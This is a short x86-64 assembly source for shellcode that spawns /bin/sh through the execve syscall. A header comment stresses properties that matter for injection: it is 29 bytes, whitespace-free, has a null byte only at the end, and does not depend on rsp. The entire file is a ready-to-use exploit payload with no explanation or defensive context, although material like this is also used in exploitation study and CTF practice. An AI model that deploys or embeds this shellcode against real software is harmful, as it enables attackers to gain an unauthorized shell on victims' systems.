; execve("/bin/sh", NULL, NULL), null at end, whitespace-free, 29 bytes, does not use rsp or any other register
BITS 64
start:
lea rdi, [rel start]
add rdi, str-start
xor esi, esi
xor edx, edx
xor eax, eax
mov al, 59              ; __NR_execve
syscall
str:
db "/bin/sh", 0
